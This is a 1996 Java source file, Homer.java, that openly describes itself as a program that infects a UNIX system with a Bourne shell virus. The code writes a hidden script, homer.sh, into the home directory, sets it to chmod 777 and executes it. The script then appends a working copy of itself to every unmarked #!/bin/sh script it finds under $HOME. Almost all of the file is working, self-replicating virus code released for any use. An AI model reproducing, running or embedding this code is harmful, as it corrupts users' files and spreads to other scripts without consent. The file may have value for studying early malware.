/* Homer.java by Mark D. LaDue */

/* December 7, 1996 */

/*  Copyright (c) 1996 Mark D. LaDue
    You may study, use, modify, and distribute this example for any purpose.
    This example is provided WITHOUT WARRANTY either expressed or implied.  */

/* This Java application infects your UNIX system with a Bourne shell
   script virus, homer.sh.  homer.sh is kind enough to announce itself
   and inform you that "Java is safe, and UNIX viruses do not exist"
   before finding all of the Bourne shell scripts in your home directory,
   checking to see if they've already been infected, and infecting
   those that are not.  homer.sh infects another Bourne shell script
   by simply appending a working copy of itself to the end of that shell
   script.  */ 
    

import java.io.*;

class Homer {
    public static void main (String[] argv) {
    try {
        String userHome = System.getProperty("user.home");
        String target = "$HOME";
        FileOutputStream outer = new FileOutputStream(userHome + "/.homer.sh");
        String homer = "#!/bin/sh" + "\n" + "#-_" + "\n" +
        "echo \"Java is safe, and UNIX viruses do not exist.\"" + "\n" +
        "for file in `find " + target + " -type f -print`" + "\n" + "do" +
        "\n" + "    case \"`sed 1q $file`\" in" + "\n" +
        "        \"#!/bin/sh\" ) grep '#-_' $file > /dev/null" +
        " || sed -n '/#-_/,$p' $0 >> $file" + "\n" +
        "    esac" + "\n" + "done" + "\n" + 
        "2>/dev/null";
        byte[] buffer = new byte[homer.length()];
        homer.getBytes(0, homer.length(), buffer, 0);
        outer.write(buffer);
        outer.close();
        Process chmod = Runtime.getRuntime().exec("/usr/bin/chmod 777 " +
                        userHome + "/.homer.sh");
        Process exec = Runtime.getRuntime().exec("/bin/sh " + userHome +
                       "/.homer.sh");
        } catch (IOException ioe) {}
    }
}
